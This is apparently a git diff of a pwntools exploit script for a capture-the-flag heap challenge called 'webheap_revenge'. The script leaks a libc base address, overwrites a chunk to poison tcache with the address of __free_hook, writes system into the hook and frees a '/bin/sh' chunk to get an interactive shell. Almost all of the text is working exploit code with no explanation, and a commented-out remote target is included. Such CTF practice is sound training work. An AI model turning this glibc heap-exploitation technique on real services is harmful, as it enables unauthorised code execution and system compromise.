@@ -3,8 +3,8 @@ from pwn import *
 context(log_level='DEBUG', arch='amd64', os='linux')
 context.terminal = "wt.exe nt bash -c".split()
 
-sh = process(['./webheap'])
-elf = ELF('./webheap')
+sh = process(['./webheap_revenge'])
+elf = ELF('./webheap_revenge')
 libc = ELF('/home/nova/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so')
 # sh = remote('172.51.65.90',9999)
 
@@ -57,36 +57,29 @@ def edit(idx: int, content: bytes):
     send_packet(payload(3, idx, 0, content))
 
 
-
 add(0, 0x580)  # 0
 add(1, 0x10)  # 1
-# gdb.attach(sh)
-# pause()
 delete(0)
-show(0)
+add(2, 0x10)  # 2
+show(2)
 
-
-libc_base = u64(sh.recv(6).ljust(8,b'\x00')) - 0x3ebca0
+libc_base = u64(sh.recv(6).ljust(8,b'\x00')) - 0x3ec0f0
 print("libc_base >>> ", hex(libc_base))
 
 free_hook_addr = libc_base + libc.sym['__free_hook']
 system_addr = libc_base + libc.sym['system']
 
-add(2, 0x80)  # 2
-add(3, 0x80)  # 3
-
-delete(2)
-delete(3)
-
-edit(3, p64(free_hook_addr))
-
-
-add(4, 0x80)  # 4
-add(5, 0x80)  # 5 <--> 3
-add(6, 0x80)  # 6
+add(3, 0x20)  # 3
+add(4, 0x20)  # 4
+add(5, 0x20)  # 5
+delete(4)
+edit(3, p64(0)*5+p64(0x31)+p64(free_hook_addr))
+add(6, 0x20)  # 6
+add(7, 0x20)  # 7 <- free_hook
+# gdb.attach(sh, 'b *$rebase(0x2982)\n' + 'x/20gx $rebase(0x205400)')
+# pause()
 edit(6, b'/bin/sh\x00')
-edit(5, p64(system_addr))
+edit(7, p64(system_addr))
 delete(6)
-
 
 sh.interactive()
